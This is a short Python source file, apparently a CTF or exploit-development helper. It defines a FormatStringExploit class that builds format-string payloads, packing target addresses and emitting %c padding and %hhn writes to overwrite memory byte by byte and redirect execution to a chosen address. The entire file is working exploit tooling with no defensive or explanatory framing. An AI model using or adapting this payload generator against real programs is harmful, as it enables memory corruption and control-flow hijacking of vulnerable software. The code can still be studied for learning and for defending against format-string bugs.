import struct

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)
get_byte = lambda x : (x[0], x[1] & 0xff)

class FormatStringExploit:
    printed = 0
    table = {
            32 : [p32, 4],
            64 : [p64, 6]
            }

    def __init__(self, printed=0, hijack_target=None, hijack_address=None):
        self.hijack_target = hijack_target
        self.hijack_address = hijack_address
        FormatStringExploit.printed += printed
        
    def address_setup(self, size=4):
        '''Arrange size of addres per byte for optimization'''
        adr = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
        return sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)

    @staticmethod
    def sort_multi_address(adr):
        '''This is for hijack multiple target once'''
        return sorted(adr, key=lambda x : x[1])
        
    @classmethod
    def generate_target(cls, adr, bits):
        payload = ''.join(cls.table[bits][0](i[0]) for i in adr)
        cls.printed += cls.table[bits][1] * len(adr)
        return payload

    @classmethod
    def generate_fmt(cls, adr, offset):
        adr = map(lambda x : x[1], adr)
        payload = ''
        for idx, byte in enumerate(adr):
            pad = ((byte - cls.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%{}c".format(pad)
            payload += "%{}$hhn".format(offset + idx)
            cls.printed += pad
        return payload

    def generate32(self, off):
        adr = self.address_setup()
        payload = self.generate_target(adr, 32)
        payload += self.generate_fmt(adr, off)
        return payload

    @classmethod
    def size(cls):
        '''Return already printed words'''
        return cls.printed
